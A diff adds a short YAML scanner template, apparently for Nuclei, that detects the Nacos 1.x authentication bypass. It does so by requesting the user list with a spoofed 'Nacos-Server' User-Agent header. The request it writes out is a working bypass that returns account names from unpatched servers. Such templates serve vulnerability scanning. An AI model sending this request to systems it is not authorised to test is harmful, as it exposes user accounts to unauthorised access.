@@ -1,0 +1,15 @@
+id: nacos-auth-bypass
+info:
+  name: Nacos 1.x 认证绕过（UA 白名单）
+  severity: high
+requests:
+  - method: GET
+    path: /nacos/v1/auth/users?pageNo=1&pageSize=9
+    headers:
+      User-Agent: Nacos-Server
+    matchers:
+      - type: status
+        status: [200]
+      - type: contains
+        words: ["username", "pageItems"]
+    condition: and
